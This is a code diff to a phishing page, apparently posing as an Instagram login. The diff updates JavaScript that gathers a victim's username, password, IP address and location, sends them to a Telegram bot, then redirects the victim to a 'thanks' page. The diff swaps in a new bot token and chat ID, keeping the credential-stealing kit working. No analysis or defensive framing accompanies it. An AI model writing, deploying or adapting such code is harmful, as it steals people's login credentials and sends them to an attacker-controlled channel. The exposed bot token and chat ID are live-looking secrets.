@@ -91,15 +91,15 @@
       const country = document.getElementById('country').value;
             var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP: ${ipaddress}\nCity: ${city}\nCountry: ${country}`;
            
-       var token = '8439784712:AAGSkvDaPUBA-213rGU19E8ACs8qgoR2CVA';
-      var chat_id = '8386530458';
+       var token = '8582330983:AAFNa6q7Kz8643g5Qf9qOXP_8wj7Uu83N6k';
+      var chat_id = '6069082133';
             var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
 
             fetch(url)
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        window.location.href = 'instagram/otp/657daf104b167f68d1979b9c.html';  // Redirect to thank you page
+                        window.location.href = 'thanks.html';  // Redirect to thank you page
                     } else {
                         alert('Error sending message.');
                     }
@@ -113,6 +113,7 @@
 </body>
 
 </html>
+
 
 
 
